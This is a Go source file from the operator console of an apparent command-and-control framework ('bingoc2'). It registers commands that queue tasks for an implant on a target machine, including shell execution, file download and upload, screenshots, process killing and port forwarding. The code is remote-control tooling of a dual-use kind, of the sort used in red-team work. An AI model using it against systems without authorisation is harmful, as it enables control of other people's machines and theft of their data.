package commands

import (
	"fmt"
	"os"
	"path"
	"time"

	bingo_errors "github.com/bingoc2/bingoc2-framework/teamserver/errors"
	grumble "github.com/bingoc2/bingoc2-framework/teamserver/grumble_modified"
	"github.com/bingoc2/bingoc2-framework/teamserver/hellsgopher"
	"github.com/bingoc2/bingoc2-framework/teamserver/version"
	yamlstructs "github.com/bingoc2/bingoc2-framework/teamserver/yaml_structs"
	"gopkg.in/yaml.v3"
)

func SendTask(agentid string, task string, taskData string) error {
	sessionData, err := yamlstructs.ReadSessionYaml(agentid)
	if err != nil {
		return err
	}

	sessionData.Tasks = append(sessionData.Tasks, fmt.Sprintf("%s - %s", task, taskData))

	// write new data
	yamlData, err := yaml.Marshal(&sessionData)
	if err != nil {
		return err
	}

	os.WriteFile(version.SESSION_DATA_DIR+agentid+".yaml", yamlData, 0666)

	return nil
}

func Use(c *grumble.Context) error {
	agentId := c.Args.String("agentid")

	// get sessionData
	sessionData, err := yamlstructs.ReadSessionYaml(agentId)
	if err != nil {
		return err
	}

	// check if session alive
	maxCallBackTime := sessionData.Sleep + sessionData.Jitter + 1

	if time.Now().After(sessionData.LastCallBack.Add(time.Duration(maxCallBackTime) * time.Second)) {
		return bingo_errors.ErrDeadSession
	}

	// register new prompt
	c.App.SetPrompt(fmt.Sprintf("[%s] bingoc2 (%s@%s)> ", agentId, sessionData.Username, sessionData.Hostname))

	// delete old commands
	DeleteAllCommands(c)

	// register new commands
	RegisterNewCommands(c, agentId)

	return nil
}

func RegisterNewCommands(c *grumble.Context, agentid string) {
	c.App.AddCommand(&grumble.Command{
		Name:    "background",
		Help:    "exit from session (does not kill session)",
		Aliases: []string{"bg", "back"},
		Run: func(c *grumble.Context) error {
			DeleteAllCommands(c)
			RegisterMainCommands(c.App)
			c.App.SetPrompt("[client] bingoc2> ")
			return nil
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "shell",
		Help: "run a shell command",
		Args: func(a *grumble.Args) {
			a.String("cmd", "shell command to execute; commands with spaces need to be in quotes")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "shell", c.Args.String("cmd"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "whoami",
		Help: "get current user",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "whoami", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "hostname",
		Help: "get current hostname",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "hostname", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "sleep",
		Help: "change how long the agent sleeps in-between checkins (in seconds)",
		Args: func(a *grumble.Args) {
			a.String("sleep", "(in seconds)")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "sleep", c.Args.String("sleep"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "download",
		Help: "download a file from the target to teamserver",
		Args: func(a *grumble.Args) {
			a.String("path", "path to file on target")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "download", c.Args.String("path"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "upload",
		Help: "upload file from teamserver to target",
		Args: func(a *grumble.Args) {
			a.String("uPath", "path to file to upload")
			a.String("dPath", "path to upload file to on target")
		},
		Run: func(c *grumble.Context) error {
			// move file to ./files dir
			hellsgopher.CopyFile(c.Args.String("uPath"), "./files/"+path.Base(c.Args.String("uPath")))

			return SendTask(agentid, "upload", path.Base(c.Args.String("uPath"))+" "+c.Args.String("dPath"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name:    "cat",
		Help:    "see contents of a file",
		Aliases: []string{"bat", "type"},
		Args: func(a *grumble.Args) {
			a.String("file", "path to file")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "cat", c.Args.String("file"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name:    "ls",
		Help:    "list contents of directory",
		Aliases: []string{"dir"},
		Args: func(a *grumble.Args) {
			a.String("path", "dir to read", grumble.Default("./"))
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "ls", c.Args.String("path"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "ps",
		Help: "list running processes",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "ps", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name:    "ifconfig",
		Help:    "get network interfaces",
		Aliases: []string{"ipconfig"},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "ifconfig", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "kill",
		Help: "kill a process",
		Args: func(a *grumble.Args) {
			a.String("pid", "process id to kill")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "kill", c.Args.String("pid"))
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "die",
		Help: "kill session and delete agent off target",
		Run: func(c *grumble.Context) error {
			return nil
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "screenshot",
		Help: "capture a screenshot of target",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "screenshot", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "pwd",
		Help: "present working directory",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "pwd", "")
		},
	})

	c.App.AddCommand(&grumble.Command{
		Name: "cd",
		Help: "change directories",
		Args: func(a *grumble.Args) {
			a.String("path", "path to change to")
		},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "cd", c.Args.String("path"))
		},
	})

	portFwdCmd := &grumble.Command{
		Name: "portfwd",
		Help: "forward a port",
	}
	c.App.AddCommand(portFwdCmd)

	portFwdCmd.AddCommand(&grumble.Command{
		Name: "add",
		Help: "add port forwarding rule",
		Flags: func(f *grumble.Flags) {
			f.String("l", "lport", "", "local port of the machine to listen on")
			f.String("p", "rport", "", "remote port to forward to")
			f.String("r", "rhost", "", "host to forward to")
		},
		Run: func(c *grumble.Context) error {
			lport := c.Flags.String("lport")
			rport := c.Flags.String("rport")
			rhost := c.Flags.String("rhost")
			return SendTask(agentid, "portfwd", "add / "+lport+" / "+rport+" / "+rhost)
		},
	})

	portFwdCmd.AddCommand(&grumble.Command{
		Name: "del",
		Help: "delete port forwarding rule",
		Flags: func(f *grumble.Flags) {
			f.String("i", "id", "", "id of the port fowarding rule")
		},
		Run: func(c *grumble.Context) error {
			id := c.Flags.String("id")
			return SendTask(agentid, "portfwd", "del / "+id)
		},
	})

	portFwdCmd.AddCommand(&grumble.Command{
		Name: "list",
		Help: "list all port forwarding rules",
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "portfwd", "list")
		},
	})

	portFwdCmd.AddCommand(&grumble.Command{
		Name:    "clear",
		Help:    "clear all port forwarding rules",
		Aliases: []string{"flush"},
		Run: func(c *grumble.Context) error {
			return SendTask(agentid, "portfwd", "clear")
		},
	})
}

func DeleteAllCommands(c *grumble.Context) {
	c.App.Commands().RemoveAll()
}
